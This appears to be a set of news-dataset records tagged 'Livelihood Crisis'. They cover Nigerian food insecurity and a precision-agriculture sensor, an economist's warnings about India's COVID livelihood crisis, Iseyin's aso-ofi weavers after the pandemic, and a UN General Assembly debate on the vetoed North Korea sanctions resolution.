The analysis for the month of March covered states such as Abia, Adamawa, Benue, Borno, Cross-River, Edo, Enugu, Gombe, Jigawa, Kaduna, Kano, Katsina, Kebbi, Lagos, Niger, Plateau, Sokoto, Taraba, Yobe, Zamfara, and the Federal Capital Territory (FCT).

Not forgetting that in the 2021 Global Hunger Index, Nigeria ranks 103rd out of the 116 countries with sufficient data to calculate 2021 GHI scores. With a score of 28.3, Nigeria has a level of hunger that is serious. This narrative is obvious and needs to be changed with all hands-on deck to bring about actions that will take Nigerians out of hunger.

These various reports are very timely warnings to save the nation and the West African region from impending famine. Whilst this is frightening, it does not call for quivering but swift action to avert the danger of a famine outbreak.

The call and clamour by the Federal Government in recent times for individuals and corporates to invest in agriculture and drive towards attaining food sufficiency and reducing imports have become a public outcry. The time is now for us as a nation to take the bull by its horns to employ all necessary tools and technology to maximise food production.

With modern technologies and the deployment of the right tools in place, farmers can boost productivity and achieve greater crop yield through the practice of Precision Agriculture (PA). according to the National Research Council, 1997, Precision Agriculture is ""the application of modern information technologies to provide, process and analyse multi-source data of high spatial and temporal resolution for decision making and operations in the management of crop production.""

With the adoption of the science and art of precision agriculture through innovative technology such as FarmSense, a technology developed by AirSmat to address the need to increase efficiency and sustainability of the farming business by offering extraordinary access to real-time information that can help guide in-season decision making.

FarmSense is a device that will be placed on the farmland to help in the gathering of useful information from the farm, stores and transmits the data to the farmers in real-time on their smartphones so they can improve their crop productivity and secure the supply chain of the future in Nigeria and across Africa.

With FarmSense, farmers will be able to maximise yields, conserve resources such as water and fertiliser application, reduce waste, and enhance productivity. FarmSense is an IoT (Internet of Things) device. The functionality of the product is powered by GSM and Satellite which enables instant connections to the internet anytime and everywhere FarmSense is deployed providing 99.9% data updates.

There is an agronomic requirement for three sensors per acre providing accurate data on the farmland. Through the data collected, farmers can work smarter with decision-taking as regards areas that need attention to boost soil nutrients with the application of fertiliser and water. This further save time and cost from guess works which is the application of these soil enhancements at random times instead of precisely to specific areas of the farm.

The quest to combat food insecurity in Africa is a dare passion for AirSmat to ensure that in the near and long term, with the technological application, the continent would attain food security to feed its population. AirSmat offers holistic services and solutions for intelligent and precision agriculture using artificial intelligence. The primary goal of the agri-tech start-up is to assist farmers and farm owners in making informed decisions to maximise yields and ensure food security while increasing the bottom lines of agricultural businesses and balancing the demand-supply and price ratios in the market.",Livelihood Crisis,2022-06-13 06:47:15

""Despite mass vaccination, there is a serious possibility that intermittent crises will continue for a long time, perhaps years.
Dreze also pointed out that last year there was a relief package and today relief measures are not even being discussed.
""In short, we are heading towards a serious livelihood crisis,"" he said.
The function of this target is to pander to the super-power ambitions of the Indian elite,"" the Belgian-born Indian economist said.","India might be heading towards a ""serious livelihood crisis"" as the situation seems to be worse this time for the working class amid the COVID crisis and local restrictions by states already add up to something close to a nationwide lockdown, according to noted economist .

In an interview to PTI, he also said the government's target to make India a USD 5 trillion economy by 2024-25 was never a ""feasible target"" and was just to pander to the ""super-power ambitions"" of the Indian elite.

About the impact of the second wave of COVID on the Indian economy, the eminent economist said the situation today is not very different from what it was around this time last year as far as working people are concerned.

""The economic consequences of local lockdowns may not be as destructive as those of a national . But in some respects, things are worse this time for the working class,"" he opined.

Further, the eminent economist said the fear of infection is more widespread and that will make it hard to revive economic activity.

""Despite mass vaccination, there is a serious possibility that intermittent crises will continue for a long time, perhaps years.

""Compared with last year, many people have depleted savings and larger debts. Those who borrowed their way through last year's crisis may not be able to do it again this time,"" he observed.

Dreze also pointed out that last year there was a relief package and today relief measures are not even being discussed.

""On top of all this, local lockdowns may give way to a national relatively soon. In fact, they already add up to something close to a country-wide .

""In short, we are heading towards a serious livelihood crisis,"" he said.

On how the government could have missed seeing the second COVID-19 wave coming, Dreze said the Indian government has been in denial all along.

""Remember, the government refused to admit about any 'community transmission' of COVID for a long time, even as recorded cases were counted in millions.

""When an early analysis of official data exposed the collapse of health services, the government retracted the data,"" he said.

He pointed out that misleading statistics have been routinely invoked to reassure the public that all is well. ""Denying a crisis is the surest way to make it worse. We are now paying the price of this complacency"".

India has been reporting more than three lakh new COVID cases daily in recent weeks and the death toll due to the infection is also rising.

Noting that India is also paying the price of a long history of neglect of the health sector, especially public health, Dreze said nothing is more important than health for the quality of life, yet public expenditure on health in India has hovered around a measly 1 per cent of GDP for decades.

When asked about the sort of relief measures that could be put in place to deal with possible livelihood crisis, he said as a starter, the central government could replay the 2020 relief package.

""But it is important to go beyond that, and to consolidate the social security system on a durable basis,"" the eminent economist said, adding that ad-hoc, short-term relief measures tend to breed confusion, corruption and waste.

Dreze, who was also part of the National Advisory Council (NAC) that had advised the previous UPA government, said much can be done within the framework of existing social security schemes and laws such as the public distribution system, the National Rural Employment Guarantee Act (NREGA), the National Social Assistance Programme, and the Integrated Child Development Services.

He also noted it would be easy to provide supplementary food rations to all ration-card holders for much longer than the proposed two months, and also to expand the coverage of the public distribution system.

""Going beyond existing schemes, I think that a well-designed, inclusive cash-transfer programme would be useful,"" Dreze opined.

According to him, if intermittent crises are going to continue for years, which is very possible, it would really help to have a well-functioning system of cash relief that can be activated whenever the need arises.

""Turning India into a USD 5 trillion economy by 2024-25 was never a feasible target, and it is a useless target in any case. The function of this target is to pander to the super-power ambitions of the Indian elite,"" the Belgian-born Indian economist said.

In 2019, Prime Minister Narendra Modi envisioned to make India a USD 5 trillion economy and global power house by 2024-25.

According to Dreze, even if we accept GDP as a valid development indicator, the standard approach is to look at GDP at its per capita terms.

""But then India looks like one of the poorer countries in the world, which it is. Looking at aggregate GDP, which is naturally quite large because of India's large population, creates an illusion of prosperity and power,"" he argued.

Dreze pointed out that actually it is not entirely an illusion because if the government's interest is in power on the world stage rather than in the living conditions of the people, then, yes, aggregate GDP would matter.

""For instance, it would enable you maintain a large army. But this has nothing to do with development,"" he observed.

His striking, vulnerable eyes pounced on every object in the large earthen compound where he gathered his toys. Mojeed flocked around his 25-year-old mother, Taiwo Abduljelil, while she got busy with cloth weaving. His father was also seated at the entrance of the compound where he was weaving a bundle of polychrome threads.

Mojeed was born a few months after Nigeria announced its first total lockdown in March 2020 as part of measures to check the spread of the COVID-19 in the country. So, they call him “Corobaby”. A happy child, Mojeed teetered from one end of the compound to the other as though on an undercover mission – from his mother to the father and the paternal grandmother who weaned him.

Although the lockdown was not observed in Iseyin, a rustic Yoruba community in Oyo State, South-west Nigeria, where Mojeed and his parents live, the effect of the economic shutdown in Lagos, Nigeria’s commercial capital, and the nation’s capital city was felt everywhere. States locked their borders to curb the spread of the virus; there were travel restrictions and businesses began to nosedive.

For most households in Iseyin, where traditional cloth weaving is the major source of livelihood, they all disembarked from the wooden loom. They had woven enough clothing materials at home, but there was no one to buy them. Hands akimbo, they stared at the horizon. Some rested on their window frames lost in thought; hunger and frustration dealt a massive blow.

Mrs Abduljelil and her husband, Jelil, had nowhere to go. They had no other business or means of survival and life became unbearable. Yet, they welcomed Mojeed into the world with open hands.

“It was a tough time for us. The pandemic and the restrictions came to us unexpectedly. We had to stop working and we were sleeping all day. That was when we had our third child, Mojeed. I do not pray to witness such a pandemic in my lifetime again,” she said.

“We suffered. We sold out the materials we had at home for peanuts just to feed. I took my children to my mother-in-law to take care of them. Businesses have started picking up again, but so many of us have not recovered from the shock of COVID-19.”

Before COVID-19 disrupted the traditional cloth weaving business in the community, Mrs Abduljelil, who only attended a basic primary school, would wake up at 6 a.m., cook for the family, feed the children and step out into the compound to begin the business of the day. She used to weave two packs of materials daily. A pack, which consists of eight pieces of woven materials, is sold for N800. In other words, she used to make about N1,600 daily.

The pandemic altered everything.

“WE SURVIVED COVID BY LUCK”

It was 4 p.m. and the blazing sun was already lowering its gaze. Under a huge mango tree, 40-year-old Oluwayemisi Kehinde was at her best as she shuttled a small wooding boat across threads and locked them with the reed. Her feet were swift on the pedals of the ‘ofi’, which is the local name for a loom. The warp was long, about ten metres away from the ofi where she sat to knot it with the weft to form a beautiful pattern.

In Yoruba language, aso means cloth; so, aso-ofi loosely translates as the hand-woven textile from the loom. The process is hectic and takes days, from sorting the raw cotton or synthetic fibres to combing, spinning and warping — all done manually.

Ms Kehinde has been making aso-ofi for over 20 years. She works from 7 a.m. to 6 p.m. daily and only rests on Sundays. Her dexterity and energy were contagious as she answered questions smoothly without a break from weaving. She learnt the job when she dropped out of school after her primary education.

According to her, the height of the COVID-19 pandemic was the toughest period she has ever experienced over two decades of making aso-ofi. She sold out all the materials she had in store for lesser amounts. At some point, Ms Kehinde said, she fed her six children with mangoes. Schools were shut, so they all woke every morning thinking about where the next meal would come from.

“We feed our family and also pay children’s school fees with proceeds from this business. Customers used to come to Iseyin from different parts of the country to order various designs, quality and brands of our material. Suddenly, they disappeared, and we starved,” Ms Kehinde said.

“I used to sell a pack of aso-ofi for N5,000 or 6,000 depending on the quality because I use 100 per cent cotton. I can make ten packs in three days. So, things were good for us and we were able to meet our needs. Now, the profit has thinned owing to the recent increase in the materials we use, but the demand is increasing because we make quality aso-ofi here.”

Weaving is the primary employment of many women in Iseyin. As business starts picking up again, Ms Kehinde said she now works twice as she used to just to make life better again. But Rebeccah Ayodele said with the absence of capital, they are still finding it hard to heal.

Mrs Ayodele, a 43-year-old mother of two, practically eats and relaxes on the loom just to make up for the time lost to the pandemic. As soon as she places her feet on the pedal at 8 a.m., she works till 9 p.m. under the cover of darkness. Sometimes, her husband puts on an electricity generator for illumination.

“On a pack of material, I make a profit of N500 to N1,000, although I used to make more before COVID happened. Things were so bad that feeding became a huge problem. We prayed fervently and waited endlessly for the pandemic to end,” Mrs Ayodele said.

Kudirat Azeez, a 26-year-old expectant mother, survives on a paltry N500 she makes from producing a component part of the reed. She retreated to her bedroom when the pandemic knocked.

Resuming back to work after the COVID-19 restrictions were relaxed, the women found out the cost of materials had tripled. They had no choice, so, they diversified. Instead of waiting for ceremonial seasons when the material is in high demand, they now use the fabric for bags, shoes, belts, pillows, suits, upholstery and interior decorations. The supply to Ibadan, Abeokuta, Lagos, and other urban cities across the country has begun to improve.

ASO-OFI: A COMMUNITY’S LIFELINE

In Iseyin, the making of traditional fabrics is not just an art or trade, it is a religion. The ancient community is reputed as the home of aso-ofi, also known as aso-oke, as it reportedly began there some centuries ago. In fact, the art of traditional cloth weaving reflects in their ancestral praise.

Years back, in a typical Nigerian ceremony beaming with colours and glam, aso-ofi used to be the centre of attraction. It is the staple of special occasions like a coronation, wedding, chieftaincy, festival, naming ceremonies, burials and other important ceremonies. Some are sewn into agbada, trousers, cap; and for the women, ‘iro’ and ‘buba’ with a shawl. The thickness and colourful signature design of the material show the social and economic status of the wearer.

Call it a relic of the past, it has struggled over the years to keep itself relevant in the contemporary fashion industry. While it may no longer enjoy the popularity and huge patronage of the past owing to the prevalence of imported textile materials in the market, aso-ofi has maintained its class among the royals and the rich. Some of the textiles imported into the country include brocade, ankara, damask or lace materials from China, Japan, the United States, Malaysia and India, according to the World Integrated Trade Solution (WITS).

Nigeria has a huge appetite for importation. In 2019, the Nigerian Textile Manufacturers Association (NTMA) said the country spends $4 billion importing textiles annually. The trade report of the National Bureau of Statistics (NBS) shows that the importation of textile and textile articles rose year-on-year by 258 per cent in the first three months of 2021 to N171.8 billion from N48 billion in the same period of 2020.

According to Chimera Iheonu, a research analyst at Kwakol, a finance and technology firm, textile importation undermines the domestic industry and leads to job losses. Despite the ban on forex for imported finished textiles in Nigeria to protect local producers, foreign products are still making their way into the country.

WHAT DOES THE FUTURE HOLD FOR ASO-OFI?

Even at that, the women artisans, mostly uneducated, are doubling their efforts to ensure aso-ofi gains wide acceptance again. Despite the toll of the COVID-19 pandemic on small-scale businesses, they have decided to keep the craft alive and boost their family income. For them, it is beyond a livelihood. It is a communal activity that was passed from one generation to the other and must not go into extinction.

Such is the case of Raimot Lateef, an 18-year-old senior secondary school student at Islamic Girls High School, Iseyin. Her father taught her weaving at a very young age. Rukayat, Raimot’s 22-year-old elder sister, is also a prodigy at the job.

According to Moshood, their father, teaching his daughters how to weave fabrics is to ensure they have the skills that can fetch them money in the future and not go hungry or stranded. He said he believes female children should be empowered to fend for themselves and also contribute significantly to their families when they eventually get married.

So, as soon as Raimot comes back from school in the afternoon, she eats, freshens up and mounts the loom to weave some fabrics till late in the evening. She, however, believes the time she spends weaving cannot stop her future ambition of becoming a doctor.

“When I am not weaving, I create time to do my assignments and read my books. I was born into traditional weaving and I have been doing it since I was six years old. I really enjoy weaving these fibres into fabrics,” Raimot told this reporter, while she was busy weaving.

“I use part of the money I make from the job to buy the things that I need. I also use it to pay my school fees and that is what I will use to purchase forms for the West African Examinations Council (WAEC) examinations next year. I hope to continue with the craft after secondary school and when I become a doctor.”

However, there is still anxiety among weavers in the community about how technology may disrupt the indigenous industry. In 2012, some weavers organised a rally in Lagos to protest the influx of China-made aso-ofi in the market. They said the machine-woven fabric with oriental blend was counterfeit.

On September 27, 2016, during World Tourism Day, the Oyo State Government launched the aso-ofi festival in the community with the aim of preserving the rich cultural values of the craft and also giving the fabric a global appeal. The aso-ofi international market and museum were also inaugurated.

According to Wasiu Olatunbosun, commissioner for culture and tourism, the exportation of aso-ofi textile products to various countries across the world has been in existence from time immemorial before COVID-19 disrupted the supply. He added that the export has improved the state’s internally generated revenue.

“Aso-ofi textile products are being exported to United States, United Kingdom, Brazil, Canada, Trinidad and Tobago, among others. Recently, the state facilitated an N5 million loan from the Bank of Industry (BOI) at a very low-interest rate to the weavers and also influenced the direct supply of cotton to them. This is really important as the state is currently focused on boosting its revenue base through tourism and other non-oil sectors,” the commissioner told this reporter on the phone.

This means a lot to the women weavers in Iseyin. The resumption of export of the textile translates to more money to feed the family, take care of themselves and pay for their children’s education.",Livelihood Crisis,2022-06-10 23:16:54

Speaking in right of reply were the representatives of China and the Democratic People’s Republic of Korea.
The Democratic People’s Republic of Korea has launched 31 ballistic missiles since the beginning of this year.
“We once again urge the Democratic People’s Republic of Korea to change its course and participate in meaningful dialogue for denuclearization,” he said.
The Democratic People’s Republic of Korea’s missile and nuclear programmes pose a serious and constant threat to the security and stability of the region and beyond.","After China and the Russian Federation vetoed a draft resolution in the Security Council on 26 May aimed at tightening the sanctions regime against the Democratic People’s Republic of Korea, the General Assembly today held a debate on the issue, with speakers expressing diverging views on that country’s actions related to nuclear non-proliferation and security in the Korean Peninsula.

The meeting was the result of a landmark Assembly resolution adopted on 26 April that established a standing mandate for a debate of the 193-member organ when a veto is cast in the Council by one or more of its permanent members. The Assembly had decided that its President shall convene a formal meeting within 10 working days on the situation to which the veto was cast.

The representative of the Democratic People’s Republic of Korea, underscoring that a sovereign State has the right to self-defence, said his country is bolstering its defence capabilities to prepare for a potential security crisis on the Korean Peninsula and in the region, and to cope with the United States’ hostile threats. It has carried out weapon tests in the safest manner, he said, pointing out that no harm was done to neighbouring countries. The issue under discussion is a breach of international law by the United States and the Council’s draft resolution is a product of that country’s illegal hostile policy, he said, wondering why missile tests conducted by the United States have never been called into question or condemned by the Council.

Warning that international relations are being transformed into a “new cold war” owing to the United States’ unilateral and unfair external policy, he said that, if that country’s double standards continue, the Council can neither fulfil its responsibility for maintaining international peace and security nor restore the trust of the international community.

The speaker for the United States, warning that the Democratic People’s Republic of Korea’s repeated launches of missiles threaten the world, said that country has launched 31 ballistic missiles since the beginning of this year in violation of multiple Council resolutions adopted by consensus. The use of the veto by China and the Russian Federation in the Council has given the Democratic People’s Republic of Korea tacit approval as that country finalizes preparations for a seventh nuclear test. Those actions have been unprovoked, he said, noting that the Biden Administration has sought a dialogue without preconditions, and has also offered international aid to the that country and to deliver vaccines to its people.

Defending its position, China’s representative said his country had no choice but to vote against the draft resolution put forth by the United States given the lack of consensus. Pointing out that the situation had been easing in the past few years, he said “the Peninsula situation has developed to what it is today primarily due to the flip-flop of United States policies, its failure to uphold the results of previous dialogue and its disregard for the reasonable concerns of the Democratic People’s Republic of Korea.” The draft resolution proposed jointly by China and the Russian Federation aims to alleviate the suffering and livelihood-related difficulties of the people of that country, and injecting momentum into the political settlement, he said, encouraging all parties to support that text.

The Russian Federation’s speaker said her delegation had also voted against the text tabled by the United States in the Council, stressing that a document in favour of new sanctions would worsen the humanitarian situation in the Democratic People’s Republic of Korea. Noting that such restricted measures have failed to guarantee security on the Korean Peninsula, she said Pyongyang took positive steps to improve the situation, but the Council did not respond appropriately. The United States’ proposal of introducing new sanctions is irresponsible, she said, pointing out that, even before the COVID-19 pandemic, there was a shortage of medical supplies, food, agricultural equipment and other essential goods in the country.

The European Union’s representative, in its capacity as observer, said that, while some speakers might argue that United Nations sanctions against the Democratic People’s Republic of Korea are insensitive to the plight of its people, they include a system of comprehensive humanitarian exemptions that can facilitate the delivery of humanitarian aid. The resolution vetoed would have strengthened this system to also include exemptions for all products related to fighting the COVID-19 pandemic. Since 1995, the bloc has been at the forefront of efforts to alleviate the suffering in the Democratic People’s Republic of Korea through the funding of independent humanitarian organizations working in the country and it stands ready to resume their assistance.

The representative of the Republic of Korea expressed regret that the Council, for the first time in handling the Democratic People’s Republic of Korea’s nuclear and ballistic missile programmes since 2006, has failed to respond to the country’s serious provocations. Contrary to the argument that the Council’s silence would induce restraint and dialogue from that country, it has launched the largest number of ballistic missiles this year, including eight last Saturday alone — the largest number thus far in a single day. “We urge the Democratic People’s Republic of Korea to stop such provocative actions, abide by all relevant Council resolutions and respond to the call for dialogue and peace on the Korean Peninsula through complete, verifiable and irreversible denuclearization,” he said.

Japan’s representative, in a similar vein, said that, by repeatedly launching 60 or more ballistic missiles since 2019, the Democratic People’s Republic of Korea has continued to increase the level of threat to the region and beyond. The Council’s silence, due to the exercise of the veto, has left this grave situation unaddressed. “The credibility of the Council is at stake,” he said, stressing that “the vetoed draft resolution was well balanced”. Pointing out that the Democratic People’s Republic of Korea is the only country to have carried out nuclear tests in the twenty-first century, he urged Pyongyang to engage in diplomacy towards denuclearization and accept the repeated offers of dialogue, as well as strive to improve its humanitarian situation.

Many countries echoed calls on Pyongyang to cease developing weapons of mass destruction and their means of delivery, with Mexico’s representative pointing out that his country has on many occasions condemned the Democratic People’s Republic of Korea’s continued development of a nuclear and ballistic weapons programme. Stressing that the veto is an act of power and does not promote unity, he urged Member States to support the Franco-Mexican initiative to voluntarily restrict use of the veto in cases of mass atrocities.

However, Syria’s representative, like other speakers, expressed concern about the political exploitation of resolutions by certain actors. The implementation of sanctions against a number of Member States makes the people of these countries the biggest losers, he said.

In the afternoon, the Assembly debated and then adopted by a recorded vote a draft resolution on the status of internally displaced persons and refugees from Abkhazia, Georgia and the Tskhinvali region/South Ossetia, Georgia.

Georgia’s representative, introducing the text, said it addresses the humanitarian plight of hundreds of thousands of internally displaced persons and refugees of different ethnic backgrounds expelled from the regions of Abkhazia and Tskhinvali in his country due to multiple waves of ethnic cleansing. “Supporting the resolution puts moral pressure on the participants of the Geneva International Discussions to fulfil their obligations,” he said, urging Member States to vote in favour of the text.

Canada’s delegate, speaking also for Australia and New Zealand, said the human rights situation has gravely deteriorated due to the process of so‑called “borderization” — the erection of razor‑barbed‑wire fences and the creation of other artificial obstacles along the administrative boundary line — as well as the denial of access to international human rights monitors to the Abkhazia and South Ossetia regions. Moreover, the illegal and unjust Russian invasion of Ukraine is another stark example of why the international community must condemn the Russian Federation’s repeated aggression against its neighbours and support the rights of all forcibly displaced persons.

Likewise, Ukraine's representative said “Russia does not stop at Georgia”, and pointed to the Russian Federation’s invasion against his country in 2014 and its full-scale invasion in February. “The aggressor must and will be stopped to bring peace, security and prosperity back to the region,” he said.

Countering that view, the Russian Federation’s speaker, who requested a vote on the draft, said the text aimed exclusively at undermining normalization in the region and pressuring the sovereign states of Abkhazia and South Ossetia. Georgia and its partners must demonstrate through actions their commitment to a constructive solution to humanitarian issues based on the principles of peaceful coexistence.

Assembly President Abdulla Shahid (Maldives) also spoke today on the issue on non-proliferation/Democratic People’s Republic of Korea.

Also speaking on the Security Council special report were representatives of Denmark (on behalf of the Nordic countries), Luxembourg (on behalf of the Benelux countries), Liechtenstein, Albania, Ecuador, Ireland, Costa Rica, Türkiye, Austria, Bulgaria, Singapore, France, Indonesia, Australia, Brazil, Switzerland, Poland, Norway, Dominican Republic, Jordan, Czech Republic, Marshall Islands, Canada, Kuwait, New Zealand, Germany, Malaysia, Italy, South Africa, Estonia, Slovenia, Croatia, Iran, Latvia, Romania, Peru, Federated States of Micronesia, United Kingdom, Palau, Thailand, Iraq and Paraguay.

Speaking in right of reply were the representatives of China and the Democratic People’s Republic of Korea.

Also speaking today on the status of internally displaced persons and refugees form Abkhazia, Georgia and the Tskhinvali region/South Ossetia, Georgia were the representatives of Lithuania (on behalf of the Nordic and Baltic States), Japan, Italy, United Kingdom and Venezuela, as well as the European Union and the Permanent Observer of the Holy See.

The General Assembly will meet again at 10 a.m., on Thursday, 9 June, to elect five non-permanent members of the Security Council to replace the members whose term of office expires on 31 December and consider its agenda entitled “Notification by the Secretary-General under Article 12, paragraph 2, of the Charter of the United Nations” of matters relative to the maintenance of international peace and security that are being dealt with by the Council, and of the matters with which the Council has ceased to deal.

Strengthening of United Nations System: Security Council Special Report

ABDULLA SHAHID (Maldives), President of the General Assembly, noting that a more efficient and accountable United Nations can help build a more resilient world, said that revitalization of the United Nations was among his key priorities for the session. While the Security Council is the primary United Nations organ responsible for the maintenance of peace and security, the Assembly has the right and responsibility to act on matters of international dispute. When questions have been raised about the Council’s ability to carry out its mandate and when multilateralism is under duress, the Assembly and its membership have demonstrated their commitment to upholding the Charter and international law.

Regarding the context that spurred the proposal, he said the existence and proliferation of nuclear weapons poses an existential danger not only to humanity, but to life on the planet itself. As such, the international community must redouble its efforts to realize its common vision of a world free of nuclear weapons and mobilize with conviction and energy to resolve the many security challenges it faces. ""Our constituents expect nothing less and we owe it to them to deliver,” he said, calling on the Assembly to renew its commitment toward non-proliferation, nuclear disarmament and the peaceful use of nuclear energy.

ZHANG JUN ( China ) said that, in the past few years, the situation on the Korean Peninsula has been easing on the whole, noting that, in 2018 the Democratic People’s Republic of Korea committed to suspending nuclear tests and intercontinental ballistic missile test challenges and took several substantive measures, including the detonation of its nuclear test site. Moreover, the meeting between the leaders of the Democratic People’s Republic of Korea and the United States produced an important consensus on improving the relations between their two countries, representing an important step in the denuclearization process. However, the United States returned to the old path of “strategic patience and maximum pressure”, increasing sanctions against the Democratic People’s Republic of Korea, which intensified that country’s distrust of the United States, bringing talks to a complete deadlock. “The Peninsula situation has developed to what it is today primarily due to the flip-flop of United States policies, its failure to uphold the results of previous dialogue and its disregard for the reasonable concerns of the Democratic People’s Republic of Korea,” he said.

The United States could ease sanctions in certain areas and end joint military exercises, he said, pointing out that Council sanctions against the Democratic People’s Republic of Korea target far more than nuclear missiles and have had a huge negative impact on the livelihoods of that country’s population. In that regard, the draft resolution proposed jointly by China and the Russian Federation aims at alleviating the humanitarian and livelihood-related difficulties of the people of the Democratic People’s Republic of Korea, and injecting momentum into the political settlement concerning the Peninsula, he said, encouraging all parties to support that text. Noting that his country has put forward many reasonable proposals, he expressed hope that the United States would consider replacing the potential resolution with a presidential statement in a way that could best garner the consensus of Council members. Referring to the draft tabled by the United States, he said that, due to lack of consensus, his country had no choice but to vote against it. Noting that the United States’ moves in the Asia-Pacific region reveal that country’s double standards and hypocrisy on nuclear non-proliferation, he urged countries concerned to put regional peace and security first and create a good environment for it in the Peninsula. For its part, China takes an extremely cautious and responsible approach to every vote in the Council, taking into account whether such vote would be conducive to solving the problem, maintaining peace and security, and avoiding greater tensions.

ANNA M. ESTIGNEEVA ( Russian Federation ) said her delegation had voted against the draft resolution tabled by the United States in the Council and its reasons for doing so are available to everyone. The United States ignored the Russian Federation’s reason for not supporting a document in favour of new sanctions, which would worsen the humanitarian situation in the Democratic People’s Republic of Korea. Noting that her delegation has repeatedly said that introducing new sanctions would be a dead end, she said such restricted measures over the years have failed to guarantee security and the situation on the Korean Peninsula has only worsened. Pyongyang took positive steps to improve the situation, but the Council did not respond appropriately. Ramping up the pressure on the Democratic People’s Republic of Korea is dangerous to Pyongyang, she said, pointing out that, even before the COVID-19 pandemic, there was a shortage of medical supplies, food, agricultural equipment and other essential goods in the country. The United States proposal of introducing new sanctions is irresponsible, he said, stressing that it is futile to expect Pyongyang to disarm under a spiral of sanctions. Preventive diplomacy is being cast aside when dealing with certain countries. The Russian Federation is opposed to any military activities that imperil the security of the Korean Peninsula, she said, emphasizing that the search for mutually acceptable solutions is the only way forward to normalize the situation.

KIM SONG ( Democratic People’s Republic of Korea ), underscoring that a sovereign State has the right to self-defence, said his country is bolstering its national defence capabilities in preparation for a potential security crisis on the Korean Peninsula and in the region. His country has carried out its weapon tests in the safest manner, he said, pointing out that no harm was done to its neighbouring countries. He questioned why missile tests of different types conducted by the United States have never been called into question or condemned at the Council, stressing that the “draft sanction resolution” against his country is a product of the United States’ illegal hostile policy. While it alleges that it has no hostile intent, the United States is moving very dangerously to deprive his country of its sovereignty and the right to existence and development, he said. If that country’s double standards, unfairness, high-handedness and arbitrariness continue, the Council can neither fulfil its responsibility for maintenance of international peace and security nor restore the trust of the international community.

He went on to say that the issue under discussion is a breach of international law by the United States. Recounting various actions by that country that violate the Charter of the United Nations and international law, he said the acute tension on the Korean Peninsula and in the Asia-Pacific region is due to that country’s intemperate hegemonic policy. “The structure of international relations is being transformed into one of a ‘new cold war’ owing to the unilateral and unfair bloc-forming external policy of the United States,” he said. His country is taking measures to bolster its national defence capabilities in order to cope with the United States’ hostile threats. The Democratic People’s Republic of Korea will join the international community in efforts to ensure global peace and security and establish a fair and just international order, as well as fulfil its responsibilities and role in safeguarding peace and stability on the Korean Peninsula.

ODAWARA KIYOSHI, State Minister for Foreign Affairs of Japan , wondering if the use of the veto may have emboldened the Democratic People’s Republic of Korea, said the acceleration of its nuclear missile programme is “totally unacceptable”. By repeatedly launching 60 or more ballistic missiles since 2019, including the multiple launches made Sunday, the country has continued to increase the level of threat to the region and beyond. The Council’s silence, due to the exercise of the veto, has left this grave situation unaddressed. Noting that Council resolution 2397 (2017) clearly stipulates that the organ will take further measures in the event of an intercontinental ballistic missile launch by the Democratic People’s Republic of Korea, he said the country did launch intercontinental ballistic missiles, but the veto has prevented the Council from implementing its own decision. “The credibility of the Council is at stake,” he said, stressing that “the vetoed draft resolution was well balanced”.

“Please imagine that a ballistic missile from your neighbour were to impact just 150 kilometres off your coastline. And that their ballistic missiles have at times flown over your territory. This is exactly what has happened to us as a result of North Korea’s missile launches,” he said. The Democratic People’s Republic of Korea’s nuclear and missile development has a significant impact on global security, as well, he said, pointing out that it is the only country to have carried out nuclear tests in the twenty-first century. The country has its own track record of exporting weapons and technologies to third parties. The Council’s lack of strong action only harms the global non-proliferation regime, including the Treaty on the Non-Proliferation of Nuclear Weapons, and reinforces the need for the Council to take strong action by adopting a new resolution, he said, urging Pyongyang to engage in diplomacy towards denuclearization and accept the repeated offers of dialogue. Further, it should strive to improve its humanitarian situation, he said, also calling on the Democratic People’s Republic of Korea to take concrete measures to immediately resolve the abductions issue.

BJÖRN OLOF SKOOG, Head of Delegation of the European Union , in its capacity as observer, said that, by launching an unprecedented number of ballistic missiles since the beginning of the year — including eight missiles over the past weekend — the Democratic People’s Republic of Korea has demonstrated its brazen disregard for international law and disrespect for the United Nations. In that regard, the resolution, which was vetoed by the Russian Federation and China in the Council, intended to demonstrate that violations of international law have consequences, sometimes in the form of sanctions. Sanctions are an essential instrument for the Council to maintain or restore international peace and security, and an essential tool for convincing the Democratic People’s Republic of Korea to reverse its dangerous, current course of action, he said.

While some speakers today might argue that those actions are insensitive to the plight of that country’s people, he said the United Nations sanctions against the Democratic People’s Republic of Korea include a system of comprehensive humanitarian exemptions that can facilitate the delivery of humanitarian assistance. The resolution vetoed would have strengthened this system to also include exemptions for all products related to fighting the COVID-19 pandemic. The European Union continues to work towards ensuring the effective and meaningful implementation of those exemptions. Moreover, since 1995, the bloc has been at the forefront of efforts to alleviate the humanitarian situation in the Democratic People’s Republic of Korea through the funding of independent humanitarian organizations working in the country. The bloc stands ready to resume the assistance, but, ultimately, the welfare of vulnerable communities in that country rests on the policy of the regime, he said, calling on Pyongyang to cease developing weapons of mass destruction and their means of delivery.

MARTIN BILLE HERMANN ( Denmark ), speaking on behalf of the Nordic countries, said the power of the veto should not and must not limit the Council in fulfilling its mandate, expressing regret about its use on the issue of the Democratic People’s Republic of Korea. The Security Council has clearly affirmed that sanctions imposed are not intended to have adverse humanitarian consequences for the civilian population of the Democratic People’s Republic of Korea, he said, noting that the draft resolution, which was vetoed by two permanent Council members, proposed to broaden the humanitarian exemption mechanism. This would have been a timely update given the critical humanitarian needs in the Democratic People’s Republic of Korea, especially after recent reports of COVID-19 spreading throughout the country.

He called on that country to end its self-imposed blockade and allow the United Nations, its resident coordinator and other international organizations to re-enter and resume humanitarian work. The Nordic countries will continue to uphold the integrity and credibility of the Council’s decisions and responsibilities, he said, urging the Democratic People’s Republic of Korea to re-engage in meaningful dialogue with all relevant parties and take steps aimed at pursuing a complete, verifiable and irreversible denuclearization of the Korean Peninsula, and calling on the two permanent Council members who vetoed the resolution to reconsider their position on the matter.

OLIVER MAES ( Luxembourg ), also speaking on behalf of Belgium and the Netherlands, deeply regretted the outcome of the 26 May vote in the Council. By using their veto, the Russian Federation and China not only broke the Council’s long-standing unity on the Democratic People’s Republic of Korea’s illegal weapons of destruction and ballistic missile programmes. They also dealt a blow to the international non-proliferation regime, thereby undermining international peace and security. The Democratic People’s Republic of Korea’s launches of intercontinental ballistic and other ballistic missiles are a clear violation of relevant Council resolutions. Upholding Council resolutions is essential to demonstrate that the international community does not tolerate any country’s decision to take the course of nuclear proliferation.

